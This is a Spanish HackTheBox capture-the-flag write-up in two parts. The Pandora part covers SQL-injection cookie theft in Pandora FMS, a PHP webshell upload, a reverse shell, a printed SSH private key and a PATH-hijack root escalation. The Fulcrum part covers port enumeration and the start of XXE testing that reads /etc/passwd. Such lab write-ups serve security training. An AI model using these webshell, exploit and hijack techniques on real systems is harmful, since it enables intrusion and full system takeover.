<img src="/assets/hackthebox/img/machines/easy/pandora/5.png" />
</p>

<ul>
  <li>Podemos ocasionar un error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/6.png" />
</p>

<ul>
  <li>Al parecer existen demasiadas vulnerabilidades.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content searchsploit pandora
<span class="nt">--------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                        |  Path
<span class="nt">--------------------------------------</span> <span class="nt">---------------------------------</span>
Pandora 7.0NG - Remote Code Execution | php/webapps/47898.py
Pandora FMS - Ping Authenticated Remo | linux/remote/48334.rb
Pandora Fms - Remote Code Execution <span class="o">(</span> | linux/remote/31518.rb
Pandora Fms - SQL Injection Remote Co | php/remote/35380.rb
Pandora FMS 3.1 - Authentication Bypa | php/remote/35731.rb
Pandora FMS 3.1 - Authentication Bypa | php/webapps/15639.txt
Pandora Fms 3.1 - Blind SQL Injection | php/webapps/15642.txt
Pandora Fms 3.1 - Directory Traversal | php/webapps/15643.txt
Pandora Fms 3.1 - OS Command Injectio | php/webapps/15640.txt
Pandora Fms 3.1 - SQL Injection       | php/webapps/15641.txt
Pandora Fms 3.2.1 - Cross-Site Reques | php/webapps/17524.html
Pandora FMS 3.x - <span class="s1">'index.php'</span> Cross-S | php/webapps/36073.txt
Pandora FMS 4.0.1 - <span class="s1">'sec2'</span> Local File | php/webapps/36792.txt
Pandora Fms 4.0.1 - Local File Inclus | php/webapps/18494.txt
Pandora FMS 5.0/5.1 - Authentication  | php/webapps/37255.txt
Pandora Fms 5.0RC1 - Remote Command I | php/webapps/31436.txt
Pandora FMS 5.1 SP1 - SQL Injection   | php/webapps/36055.txt
Pandora FMS 7.0 NG 749 - <span class="s1">'CG Items'</span> S | php/webapps/49046.txt
Pandora FMS 7.0 NG 749 - Multiple Per | php/webapps/49139.txt
Pandora FMS 7.0 NG 750 - <span class="s1">'Network Sca | php/webapps/49312.txt
Pandora FMS 7.0NG - '</span>net_tools.php<span class="s1">' R | php/webapps/48280.py
Pandora FMS Monitoring Application 2. | php/webapps/10570.txt
Pandora FMS v7.0NG.742 - Remote Code  | php/webapps/50961.py
PANDORAFMS 7.0 - Authenticated Remote | php/webapps/48064.py
PandoraFMS 7.0 NG 746 - Persistent Cr | php/webapps/48707.txt
PandoraFMS NG747 7.0 - '</span>filename<span class="s1">' Per | php/webapps/48700.txt
-------------------------------------- ---------------------------------
Shellcodes: No Results
</span></code></pre></div></div>

<ul>
  <li>Buscando en GitHub encontramos este <code class="language-plaintext highlighter-rouge">exploit</code> en Python <a href="https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated">https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://raw.githubusercontent.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/master/sqlpwn.py
<span class="nt">--2024-06-19</span> 14:07:56--  https://raw.githubusercontent.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/master/sqlpwn.py
Resolving raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6230 <span class="o">(</span>6.1K<span class="o">)</span> <span class="o">[</span>text/plain]
Saving to: ‘sqlpwn.py’

sqlpwn.py                            100%[<span class="o">=====================================================================&gt;]</span>   6.08K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s

2024-06-19 14:07:56 <span class="o">(</span>43.8 MB/s<span class="o">)</span> - ‘sqlpwn.py’ saved <span class="o">[</span>6230/6230]
</code></pre></div></div>

<ul>
  <li>Si analizamos el <code class="language-plaintext highlighter-rouge">exploit</code> vemos que esta subiendo una <code class="language-plaintext highlighter-rouge">webshell</code> a una ruta lo cual esto ya es interesante ya que con esto sabemos que se pueden subir archivos pero supongo que eso es cuando ya estas dentro del panel de este servicio.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/7.png" />
</p>

<ul>
  <li>Además las primeras líneas del <code class="language-plaintext highlighter-rouge">script</code> vemos que se esta empleando una cookie del usuario administrador la cual aun no tenemos vamos a copiarnos la inyección para ver que es lo que hace.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/8.png" />
</p>

<ul>
  <li>No vemos nada.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/9.png" />
</p>

<ul>
  <li>Pero bueno hay que recordar que con esta <code class="language-plaintext highlighter-rouge">query</code> le estamos robando la cookie al usuario administrador así que si esto funciono solo quitamos toda la <code class="language-plaintext highlighter-rouge">query</code> que metimos y listo estamos logueados.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/10.png" />
</p>

<h2 id="shell-as-matt">Shell as matt</h2>

<ul>
  <li>Aquí vemos una parte donde dice File Manager.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/11.png" />
</p>

<ul>
  <li>Creamos un nuevo directorio.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/12.png" />
</p>

<ul>
  <li>Vemos que esta en la ruta <code class="language-plaintext highlighter-rouge">images</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/13.png" />
</p>

<ul>
  <li>Vamos a subir un <code class="language-plaintext highlighter-rouge">cmd.php</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
	<span class="nb">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="nb">.</span> shell_exec<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span> <span class="nb">.</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
?&gt;
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/14.png" />
</p>

<ul>
  <li>Podemos ejecutar comandos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/15.png" />
</p>

<ul>
  <li>Vamos a ponernos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/16.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.62] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.136] 39764
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>928<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
matt@pandora:/var/www/pandora/pandora_console/images/xd<span class="nv">$ </span><span class="nb">whoami
whoami
</span>matt
matt@pandora:/var/www/pandora/pandora_console/images/xd<span class="err">$</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:/var/www/pandora/pandora_console/images/xd<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
&lt;pandora_console/images/xd<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
Script started, file is /dev/null
matt@pandora:/var/www/pandora/pandora_console/images/xd<span class="nv">$ </span>^Z
<span class="o">[</span>1]  + 28851 suspended  nc <span class="nt">-nlvp</span> 443
➜  content <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1]  + 28851 continued  nc <span class="nt">-nlvp</span> 443
                                    reset xterm
&lt;ENTER&gt;
matt@pandora:/var/www/pandora/pandora_console/images/xd<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Ya podemos ver la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:/home/matt<span class="nv">$ </span><span class="nb">cat </span>user.txt
3fb235f22fcbdf0957956bf99e229431
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Podemos conectarnos por SSH creándonos la clave id_rsa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:/home/matt<span class="nv">$ </span><span class="nb">mkdir</span> .ssh
matt@pandora:/home/matt<span class="nv">$ </span>ssh-keygen
Generating public/private rsa key pair.
Enter file <span class="k">in </span>which to save the key <span class="o">(</span>/home/matt/.ssh/id_rsa<span class="o">)</span>:
Enter passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>:
Enter same passphrase again:
Your identification has been saved <span class="k">in</span> /home/matt/.ssh/id_rsa
Your public key has been saved <span class="k">in</span> /home/matt/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:+4zYpQAjpjQhKRgfIQu5wj4JAjOycPSQ+hwVeIqBMBU matt@pandora
The key<span class="s1">'s randomart image is:
+---[RSA 3072]----+
|O+E=..           |
|%B++o            |
|@@.+.            |
|@.+              |
|==+.o   S        |
|.*+. o   .       |
|. .   . . .      |
|       + *       |
|      . + o      |
+----[SHA256]-----+
matt@pandora:/home/matt$ cd .ssh/
matt@pandora:/home/matt/.ssh$ ls
id_rsa  id_rsa.pub
matt@pandora:/home/matt/.ssh$ cat id_rsa.pub &gt; authorized_keys
matt@pandora:/home/matt/.ssh$ chmod 600 authorized_keys
</span></code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:/home/matt/.ssh<span class="nv">$ </span><span class="nb">cat </span>id_rsa
<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
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
<span class="nv">8HBQDVmx0N9RXZAAAADG1hdHRAcGFuZG9yYQECAwQFBg</span><span class="o">==</span>
<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----
</code></pre></div></div>

<ul>
  <li>Y podemos conectarnos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nano id_rsa
➜  content <span class="nb">chmod </span>600 id_rsa
➜  content ssh <span class="nt">-i</span> id_rsa matt@10.10.11.136
Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-91-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

  System information as of Wed 19 Jun 21:08:19 UTC 2024

  System load:           0.0
  Usage of /:            63.6% of 4.87GB
  Memory usage:          15%
  Swap usage:            0%
  Processes:             242
  Users logged <span class="k">in</span>:       1
  IPv4 address <span class="k">for </span>eth0: 10.10.11.136
  IPv6 address <span class="k">for </span>eth0: dead:beef::250:56ff:feb0:def7

  <span class="o">=&gt;</span> /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check <span class="k">for </span>new updates run: <span class="nb">sudo </span>apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

matt@pandora:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<ul>
  <li>Vamos a ejecutar el <code class="language-plaintext highlighter-rouge">pandora_backup</code> que vimos anteriormente para ver que pasa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:~<span class="nv">$ </span>pandora_backup
<span class="o">[</span><span class="nt">--------------------------------------------------------------------------------------</span><span class="o">]</span>
Backup successful!
Terminating program!
</code></pre></div></div>

<ul>
  <li>Como vimos el propietario es <code class="language-plaintext highlighter-rouge">root</code> y es <code class="language-plaintext highlighter-rouge">SUID</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/bin/pandora_backup
<span class="nt">-rwsr-x---</span> 1 root matt 16816 Dec  3  2021 /usr/bin/pandora_backup
</code></pre></div></div>

<ul>
  <li>Es un binario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:~<span class="nv">$ </span>file /usr/bin/pandora_backup
/usr/bin/pandora_backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>7174c3b04737ad11254839c20c8dab66fce55af8, <span class="k">for </span>GNU/Linux 3.2.0, not stripped
</code></pre></div></div>

<ul>
  <li>Vemos que se esta usando <code class="language-plaintext highlighter-rouge">tar</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:~<span class="nv">$ </span>ltrace /usr/bin/pandora_backup
getuid<span class="o">()</span>                                                                                  <span class="o">=</span> 1000
geteuid<span class="o">()</span>                                                                                 <span class="o">=</span> 1000
setreuid<span class="o">(</span>1000, 1000<span class="o">)</span>                                                                      <span class="o">=</span> 0
puts<span class="o">(</span><span class="s2">"PandoraFMS Backup Utility"</span>PandoraFMS Backup Utility
<span class="o">)</span>                                                         <span class="o">=</span> 26
puts<span class="o">(</span><span class="s2">"Now attempting to backup Pandora"</span>...Now attempting to backup PandoraFMS client
<span class="o">)</span>                                               <span class="o">=</span> 43
system<span class="o">(</span><span class="s2">"tar -cvf /root/.backup/pandora-b"</span>...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
<span class="nb">tar</span>: Error is not recoverable: exiting now
 &lt;no <span class="k">return</span> ...&gt;
<span class="nt">---</span> SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> <span class="nt">---</span>
&lt;... system resumed&gt; <span class="o">)</span>                                                                    <span class="o">=</span> 512
puts<span class="o">(</span><span class="s2">"Backup failed!</span><span class="se">\n</span><span class="s2">Check your permis"</span>...Backup failed!
Check your permissions!
<span class="o">)</span>                                              <span class="o">=</span> 39
+++ exited <span class="o">(</span>status 1<span class="o">)</span> +++
</code></pre></div></div>

<ul>
  <li>
    <p>Bueno pues como a nivel de sistema se esta ejecutando <code class="language-plaintext highlighter-rouge">tar</code> podemos hacer un <code class="language-plaintext highlighter-rouge">PATH Hijacking</code> ya que se esta haciendo de forma relativa y debería ser absoluta para evitarlo.</p>
  </li>
  <li>
    <p>Tendría que usarse de esta forma.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:~<span class="nv">$ </span>which <span class="nb">tar</span>
/usr/bin/tar
</code></pre></div></div>

<ul>
  <li>Este es el PATH.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
</code></pre></div></div>

<ul>
  <li>Lo que vamos a hacer es que nos de una <code class="language-plaintext highlighter-rouge">Bash</code> como <code class="language-plaintext highlighter-rouge">root</code> ya que <code class="language-plaintext highlighter-rouge">root</code> es la persona que esta ejecutando el binario al crearnos un archivo llamado <code class="language-plaintext highlighter-rouge">tar</code> le vamos a decir que el <code class="language-plaintext highlighter-rouge">PATH</code> comience desde donde nosotros le indiquemos que es en esta ruta para que tome nuestro <code class="language-plaintext highlighter-rouge">tar</code> y no el <code class="language-plaintext highlighter-rouge">/usr/bin/tar</code> que esa es su ruta absoluta pero aprovechándonos de que en el binario no se esta haciendo de manera correcta la llamada a <code class="language-plaintext highlighter-rouge">/usr/bin/tar</code> es por eso que podemos alterar esto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:~<span class="nv">$ </span><span class="nb">cd</span> /tmp
matt@pandora:/tmp<span class="nv">$ </span><span class="nb">touch tar
</span>matt@pandora:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x <span class="nb">tar
</span>matt@pandora:/tmp<span class="nv">$ </span>nano <span class="nb">tar
</span>matt@pandora:/tmp<span class="nv">$ </span><span class="nb">cat tar</span>
/usr/bin/sh
</code></pre></div></div>

<ul>
  <li>Ahora el <code class="language-plaintext highlighter-rouge">PATH</code> comienza en <code class="language-plaintext highlighter-rouge">tmp</code> y como va buscar el <code class="language-plaintext highlighter-rouge">tar</code> y el <code class="language-plaintext highlighter-rouge">tar</code> lo tenemos en <code class="language-plaintext highlighter-rouge">tmp</code> pues como allí lo va a encontrar va a ejecutar el de nosotros y no va a llegar ala ruta donde si esta el <code class="language-plaintext highlighter-rouge">tar</code> correcto gracias a esto ejecutara la instrucción que indicamos que es darnos una sh.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:/tmp<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
matt@pandora:/tmp<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
</code></pre></div></div>

<h2 id="shell-as-root">Shell as root</h2>

<ul>
  <li>Ahora si lo ejecutamos vamos a obtener una <code class="language-plaintext highlighter-rouge">shell</code> como el usuario <code class="language-plaintext highlighter-rouge">root</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:/tmp<span class="nv">$ </span>pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
<span class="c"># whoami</span>
root
<span class="c"># bash</span>
root@pandora:/tmp# <span class="nb">cat</span> /root/root.txt
774d751ca4a7eabaed28a386f20a26c2
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Fulcrum (insane)</title><link href="http://localhost:4000/hackthebox/machines/insane/2024/06/15/fulcrum.html" rel="alternate" type="text/html" title="HackTheBox - Fulcrum (insane)" /><published>2024-06-15T00:00:00-06:00</published><updated>2024-06-15T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/insane/2024/06/15/fulcrum</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/insane/2024/06/15/fulcrum.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/31252a37873dc31f600f40de91dd52d6.png" />
</p>

<ul>
  <li>Fulcrum is one of the most challenging machines on Hack The Box. It requires multiple pivots between Linux and Windows, and focuses heavily on the use of PowerShell.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos y servicios de la máquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p4</span>,22,80,88,9999,56423 10.10.10.62 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-14 12:29 CST
Nmap scan report <span class="k">for </span>10.10.10.62
Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE VERSION
4/tcp     open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0 (Ubuntu)
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp    open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Input string was not in a correct format.
88/tcp    open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: phpMyAdmin
| http-robots.txt: 1 disallowed entry
|_/
9999/tcp  open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Input string was not in a correct format.
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Potentially risky methods: TRACE
56423/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: Fulcrum-API Beta
|_http-title: Site doesn'</span>t have a title <span class="o">(</span>application/json<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8<span class="o">)</span><span class="nb">.</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>
    <p>Tenemos puertos abiertos que corren el servicio <code class="language-plaintext highlighter-rouge">http</code> y uno <code class="language-plaintext highlighter-rouge">ssh</code>.</p>
  </li>
  <li>
    <p>Vamos a ver lo que hay en cada servicio.</p>
  </li>
  <li>
    <p>En el puerto <strong>80</strong> vemos lo siguiente.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/1.png" />
</p>

<ul>
  <li>En el puerto <strong>88</strong> vemos el panel típico de <code class="language-plaintext highlighter-rouge">phpMyAdmin</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/2.png" />
</p>

<ul>
  <li>El puerto <strong>9999</strong> vemos lo mismo que en el puerto <strong>80</strong>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/3.png" />
</p>

<ul>
  <li>Vemos esto en el puerto <strong>4</strong>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/4.png" />
</p>

<ul>
  <li>Si le damos <code class="language-plaintext highlighter-rouge">click</code> en try again vemos que la <code class="language-plaintext highlighter-rouge">url</code> es interesante.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/5.png" />
</p>

<ul>
  <li>Hay otro puerto abierto el cual nos muestra data en formato <code class="language-plaintext highlighter-rouge">JSON</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/6.png" />
</p>

<ul>
  <li>Algo que podemos hacer es modificar la data con <code class="language-plaintext highlighter-rouge">BurpSuite</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/7.png" />
</p>

<ul>
  <li>Si enviamos data vemos que es lo mismo no cambia.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/8.png" />
</p>

<ul>
  <li>
    <p>Algo que podemos hacer es pasarle una estructura en <code class="language-plaintext highlighter-rouge">xml</code>.</p>
  </li>
  <li>
    <p>Vemos que ahora si cambia.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/9.png" />
</p>

<h2 id="shell-as-www-data">Shell as www-data</h2>

<ul>
  <li>
    <p>Vamos a probar un XXE <a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity">https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity</a>, <a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a>.</p>
  </li>
  <li>
    <p>Declaramos una entidad que se llama <code class="language-plaintext highlighter-rouge">xxe</code> que usa un <code class="language-plaintext highlighter-rouge">wrapper</code> de tipo file que carga el <code class="language-plaintext highlighter-rouge">/etc/passwd</code> de la máquina.</p>
  </li>
  <li>
    <p>Pero no nos reporta nada.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/10.png" />
</p>

<ul>
  <li>Podemos cambiar las etiquetas a las nuestras para ver si cambia algo.</li>
</ul>

